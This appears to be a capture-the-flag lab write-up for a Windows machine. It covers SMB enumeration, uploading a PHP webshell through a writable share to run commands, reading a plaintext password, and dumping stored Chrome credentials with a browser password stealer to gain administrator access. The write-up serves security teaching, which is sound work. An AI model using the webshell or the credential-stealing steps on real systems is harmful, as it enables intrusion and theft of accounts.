## Breaking Windows
```
Breaking Windows is an introductory Windows challenge focused on enumeration. Basic Windows  knowledge will be immensely helpful. This VM simulates an internal server used by employees.
```
## Initial Access
We'll start with an `nmap` scan against the machine:
```
$ nmap 10.10.11.131      
	Nmap scan report for 10.10.11.131
	Host is up (0.00080s latency).
	Not shown: 995 closed tcp ports (reset)
	PORT    STATE SERVICE
	22/tcp  open  ssh
	80/tcp  open  http
	135/tcp open  msrpc
	139/tcp open  netbios-ssn
	445/tcp open  microsoft-ds
```
There are three services present on the machine, `SSH`, `HTTP`, and `SMB`. We'll start first by enumeration the `HTTP` service.
### HTTP
Running `curl` on the website reveals a very simple `HTTP` site. However, it does reveal that the server is powered by `Microsoft IIS` and `PHP 8.3.3`. Let's enumeration for directories, or files that might be helpful. 
```
$ curl http://10.10.11.131 -v
	*   Trying 10.10.11.131:80...
	* Connected to 10.10.11.131 (10.10.11.131) port 80
	< HTTP/1.1 200 OK
	< Content-Type: text/html; charset=UTF-8
	< Server: Microsoft-IIS/10.0
	< X-Powered-By: PHP/8.3.3
	< Date: Sat, 25 Jan 2025 05:43:42 GMT
	< Content-Length: 35
	< 
	Welcome To the Company Web Server!
	* Connection #0 to host 10.10.11.131 left intact
```
#### ffuf
Using the following command, we can start fuzzing for directories. However, we'll notice that the server does not send an error code for files it cannot find, and so ffuf always returns an error, which makes the directory scanning prohibitively slow. Let's move onto the `SMB` server.
```
$ ffuf -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.10.11.130/FUZZ
```
### SMB
Let's try to access the `SMB` service without any credentials with the following command:
```
$ smbclient --no-pass -L //10.10.11.131/     
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Personal        Disk
```
It works! We can see there are for shares, and one of them is a non standard share, `Personal`. Let's see if we can access that directory with credentials as well, with the following command:
```
$ smbclient --no-pass //10.10.11.131/Personal
Try "help" to get a list of possible commands.
smb: \>
```
We can access it! We can use the `dir` command to list files, and the `get` command to download them.
```
smb: \> dir
  .                                   D        0  Fri Jan 24 22:36:44 2025
  ..                                  D        0  Fri Jan 24 22:36:44 2025
  Welcome!.txt                        A      219  Tue Feb 27 20:21:13 2024

                6425087 blocks of size 4096. 3118935 blocks available
smb: \> get Welcome!.txt 
	getting file \Welcome!.txt of size 219 as Welcome!.txt
```
`Welcome!.txt` contains the following text:
```
Hey Everyone, 

This is your place to place your own webpages. 
Please make sure your file names don't impead others.

Remember you can access them through /Personal/<File> on the webserver!.


Thanks!
- John
```
Looks like this share is a way for employees to share files on the webserver. We can check if this is the case by trying to see if we can access this same file on the webserver with the following command:
```
$ curl 'http://10.10.11.131/Personal/Welcome!.txt'
	Hey Everyone, 
	
	This is your place to place your own webpages. 
	Please make sure your file names don't impead others.
	
	Remember you can access them through /Personal/<File> on the webserver!.
	
	
	Thanks!
	- John
```
Let's craft a `PHP` webshell, and see if we can upload it on the share, and access it through the webserver. Our `shell.php` file should contain the following:
```
<?php echo system($_REQUEST['cmd']); ?>
```
We can upload files to the `SMB` share with the `put` command:
```
smb: \> put shell.php 
	putting file shell.php as \shell.php
```
Let's try to access it with `curl`:
```
$ curl 'http://10.10.11.131/Personal/shell.php?cmd=whoami'
	breakingwindows\web
```
It works! We can get the flag with the following command:
```
$ curl 'http://10.10.11.131/Personal/shell.php?cmd=type+C:\inetpub\flag.txt'
	BW{smb_rev_shell}
```
## Lateral Movement
After searching the file system for any files, we find a file called `John.txt` in the Public Documents folder. The contents seem to reveal the password for the user `john`.
```
$ curl 'http://10.10.11.131/Personal/shell.php?cmd=type+C:\Users\Public\Documents\John.txt'
John,

Don't forget your to change this password once you log in next.

john:dontforgetthis!1


Also, you'll notice you are not an admin on this machine. 
I'll provide the password in person that will allow you to elevate.
Please don't save it anywhere on the computer. 

Thanks,
Network Admin
```
Let's try to login as `john` on the `SSH` server, providing the password we just found.
```
$ ssh john@10.10.11.131
	john@10.10.11.131's password:
	
	john@BREAKINGWINDOWS C:\Users\john> whoami                        
		breakingwindows\john
```
It works! We can get the flag with the following command:
```
john@BREAKINGWINDOWS C:\Users\john> type Desktop\flag.txt
	BW{plaintext_creds}
```
## Privilege Escalation
In the file `John.txt`, the Network Admin says he'll give John an admin password to the machine later and that it should not be stored on the machine. There are multiple browsers present on the machine, and one may have the credentials we are looking for.  We can use a Browser Password Stealer. As `python` is present on the machine, we'll use this [one](https://github.com/henry-richard7/Browser-password-stealer). After transferring it over to the machine, we can run it with the following command:
```
john@BREAKINGWINDOWS C:\Users\john> python .\chromium_based_browsers.py
```
The command output says it found credentials in Chrome! We can use `type` to see the exported credentials. 
```
john@BREAKINGWINDOWS C:\Users\john> type chrome\login_data.txt
	URL
	Email: administrator 
	Password: BreakingWindows2024
```
Let's try to login as `administrator` on the `SSH` server, providing the password we just found.
```
$ ssh administrator@10.10.11.131
	administrator@10.10.11.131's password:
	
	administrator@BREAKINGWINDOWS C:\Users\Administrator> whoami                
			breakingwindows\administrator
```
It works! We can get the flag with the following command:
```
administrator@BREAKINGWINDOWS C:\Users\Administrator> type Desktop\flag.txt
	BW{improper_cred_storage}
```